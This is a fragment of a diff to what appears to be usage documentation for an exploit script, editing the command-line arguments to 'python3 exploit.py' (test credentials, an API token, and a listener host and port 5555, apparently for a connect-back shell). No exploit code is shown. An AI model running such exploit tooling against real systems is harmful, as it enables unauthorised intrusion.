@@ -203,7 +203,7 @@ python3 exploit.py
 -un test
 -pw test
 -t <API_TOKEN>
--lh 10.10.Χ.Χ <YOUR_IP>
+-lh <YOUR_IP>
 -lp 5555
 
 
